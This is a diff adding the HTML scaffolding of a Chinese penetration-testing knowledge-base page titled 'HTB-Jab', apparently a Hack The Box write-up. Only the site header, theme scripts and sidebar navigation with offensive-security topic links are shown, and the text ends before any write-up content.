@@ -1,0 +1,4460 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="TimeLess613">
+      
+      
+      
+        <link rel="prev" href="../HTB-Surveillance/">
+      
+      
+        <link rel="next" href="../HTB-Headless/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
+    
+    
+      
+        <title>HTB-Jab - HacKnowledgeBase</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../static/css/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+   <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#summary" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="HacKnowledgeBase" class="md-header__button md-logo" aria-label="HacKnowledgeBase" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            HacKnowledgeBase
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HTB-Jab
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="cyan" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/TimeLess613/kiwi" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    TimeLess613/kiwi
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../.." class="md-tabs__link">
+          
+  
+  Home
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../basic-concepts/basic-concepts/" class="md-tabs__link">
+        
+  
+    
+  
+  基础概念
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../information-gathering/information-gathering/" class="md-tabs__link">
+          
+  
+  信息收集
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../initial-access/initial-access/" class="md-tabs__link">
+          
+  
+  初始访问
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../privilege-escalation/privilege-escalation/" class="md-tabs__link">
+          
+  
+  提权
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../post-exploitation/Persistence/" class="md-tabs__link">
+          
+  
+  后渗透
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../arsenal/nmap/" class="md-tabs__link">
+          
+  
+  武器库
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Resources/simple-network-service/" class="md-tabs__link">
+          
+  
+  Resources
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../BlueTeam/Splunk/SPL%20memo/" class="md-tabs__link">
+          
+  
+  BlueTeam
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../active/writeup-template/" class="md-tabs__link">
+          
+  
+  靶机WriteUp
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="HacKnowledgeBase" class="md-nav__button md-logo" aria-label="HacKnowledgeBase" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    HacKnowledgeBase
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/TimeLess613/kiwi" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    TimeLess613/kiwi
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            Home
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    主页
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tool-links/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tool Links
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../material-color-palette/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    配色变更
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../basic-concepts/basic-concepts/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    基础概念
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    信息收集
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            信息收集
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/information-gathering/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/footprinting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    踩点
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/scanning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    扫描
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/enumerate/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    枚举
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/summary/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    思路
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    初始访问
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            初始访问
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../initial-access/initial-access/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../initial-access/web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WEB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../initial-access/%E5%8F%8D%E5%BC%B9shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    反弹shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    提权
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            提权
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../privilege-escalation/privilege-escalation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../privilege-escalation/waiting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../privilege-escalation/waiting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    后渗透
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            后渗透
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/Persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    权限维持
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/ClearingTracks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    痕迹清理
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tunneling
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            Tunneling
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/tunneling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tunneling
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/SSH%20Tunneling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH Tunneling
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    File Transfers
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
+            <span class="md-nav__icon md-icon"></span>
+            File Transfers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/FileTransfers-Linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/FileTransfers-Windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WIndows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    武器库
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            武器库
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/Netcat/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Netcat
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
